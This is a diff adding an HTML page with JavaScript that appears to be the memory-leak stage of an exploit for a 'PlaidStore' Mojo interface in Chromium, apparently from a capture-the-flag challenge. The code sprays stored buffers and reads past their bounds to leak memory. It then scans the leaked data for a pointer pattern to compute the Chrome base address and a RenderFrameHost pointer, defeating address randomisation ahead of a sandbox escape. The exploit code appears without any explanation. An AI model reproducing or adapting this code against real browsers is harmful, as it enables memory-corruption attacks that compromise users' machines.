@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    </head>
+    <body>
+        <script src="mojo/public/js/mojo_bindings_lite.js"></script>
+        <script src="third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
+	<script>
+	async function leak() {
+		//Same code with the one in pwn.js
+		console.log("Starting frame leak");
+		var stores = [];
+		let p = blink.mojom.PlaidStore.getRemote(true);
+		for(let i = 0;i< 0x40; i++ ){
+			await p.storeData("yeet"+i,new Uint8Array(0x28).fill(0x41));
+			stores[i] = blink.mojom.PlaidStore.getRemote(true);
+		}
+		let chromeBase = 0;
+		let renderFrameHost = 0;
+		for(let i = 0;i<0x40&&chromeBase==0;i++){
+			let d = (await p.getData("yeet"+i,0x200)).data;
+			let u8 = new Uint8Array(d)
+			let u64 = new BigInt64Array(u8.buffer);
+			for(let j = 5;j<u64.length;j++){
+				let l = u64[j]&BigInt(0xf00000000000)
+				let h = u64[j]&BigInt(0x000000000fff)
+				if((l==BigInt(0x500000000000))&&h==BigInt(0x7a0)){
+					chromeBase = u64[j]-BigInt(0x9fb67a0);
+					renderFrameHost = u64[j+1];
+					break;
+				}
+			}
+		}
+		window.chromeBase = chromeBase;
+		window.renderFrameHost = renderFrameHost;
+		window.p = p;
+		return chromeBase!=0&&renderFrameHost!=0;
+	}
+	</script>
+    </body>
+</html>
